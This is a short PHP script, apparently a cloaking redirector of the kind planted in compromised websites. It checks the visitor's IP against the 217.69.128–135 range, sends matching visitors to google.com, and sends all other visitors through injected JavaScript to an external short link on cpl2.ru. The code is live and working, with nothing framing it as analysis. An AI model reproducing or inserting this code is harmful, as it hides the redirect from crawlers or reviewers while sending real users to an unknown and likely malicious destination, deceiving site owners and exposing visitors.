<?
if(preg_match('#217.69.(12[8-9]{1}|13[0-5]{1}).\d#' ,$_SERVER['REMOTE_ADDR'],$matches)){
echo '<script>window.location="http://google.com/";</script>'; } 
else {
echo '<script>window.location="http://c.cpl2.ru/6U37";</script>'; } 
?>